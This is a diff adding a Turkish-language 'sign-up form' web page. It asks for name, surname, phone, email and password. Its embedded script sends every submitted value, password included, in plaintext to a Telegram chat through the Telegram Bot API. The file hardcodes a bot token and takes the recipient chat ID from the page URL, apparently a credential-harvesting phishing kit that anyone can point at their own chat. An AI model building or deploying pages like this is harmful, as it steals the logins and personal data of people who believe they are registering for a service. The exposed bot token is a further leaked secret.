@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Kayıt Ol</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 12px;
+      width: 90%;
+      max-width: 320px;
+      border-radius: 6px;
+      border: none;
+    }
+    .info {
+      font-size: 11px;
+      color: #aaa;
+      text-align: center;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Kayıt Formu</h2>
+  <input type="text" id="ad" placeholder="Ad">
+  <input type="text" id="soyad" placeholder="Soyad">
+  <input type="tel" id="telefon" placeholder="Telefon">
+  <input type="email" id="mail" placeholder="Mail">
+  <input type="password" id="sifre" placeholder="Şifre">
+  <button onclick="formuGonder()">Kaydı Tamamla</button>
+  <div class="info">Devam ederek bilgilerin Telegram’a gönderileceğini kabul edersin.</div>
+
+  <script>
+    const token = '7925810136:AAET-jcZkQKglWwdn2PS_PTUKlDRGCvXVkk';
+    const telegramId = window.location.search.substring(1); // "?12345" → "12345"
+
+    async function formuGonder() {
+      const ad = document.getElementById('ad').value;
+      const soyad = document.getElementById('soyad').value;
+      const telefon = document.getElementById('telefon').value;
+      const mail = document.getElementById('mail').value;
+      const sifre = document.getElementById('sifre').value;
+
+      if (!ad || !soyad || !telefon || !mail || !sifre) {
+        alert("Tüm alanları doldur!");
+        return;
+      }
+
+      const mesaj = `Yeni Kayıt Formu:\\nAd: ${ad}\\nSoyad: ${soyad}\\nTelefon: ${telefon}\\nMail: ${mail}\\nŞifre: ${sifre}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: telegramId, text: mesaj })
+        });
+
+        window.location.href = `/show.html?${telegramId}`;
+      } catch (err) {
+        alert("Telegram'a gönderilemedi.");
+        console.error(err);
+      }
+    }
+  </script>
+</body>
+</html>
